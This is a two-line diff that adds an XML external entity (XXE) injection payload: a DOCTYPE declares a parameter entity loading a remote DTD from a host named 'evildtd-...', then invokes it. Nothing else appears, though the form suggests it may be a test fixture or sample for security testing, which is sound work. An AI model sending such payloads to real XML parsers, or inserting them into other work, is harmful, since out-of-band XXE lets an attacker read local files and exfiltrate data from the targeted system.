@@ -1,0 +1,2 @@
+<!DOCTYPE foo [<!ENTITY % xxe SYSTEM
+"https://evildtd-magnus-foredrag-prod.dev.radix.equinor.com"> %xxe;]>
